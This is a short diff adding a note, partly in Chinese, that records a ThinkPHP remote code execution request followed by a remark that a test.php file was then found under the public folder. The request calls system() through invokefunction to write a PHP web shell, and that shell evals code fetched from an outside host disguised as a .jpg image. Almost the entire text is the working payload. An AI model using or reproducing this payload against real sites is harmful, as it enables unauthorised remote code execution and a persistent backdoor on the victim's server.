@@ -1,0 +1,3 @@
+http://你的域名/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20@eval(file_get_contents("http%3a%2f%2fcqy666.cn%2fphp.jpg"))?^>>test.php
+
+之后在public下面发现了一个PHP文件 是 test.php
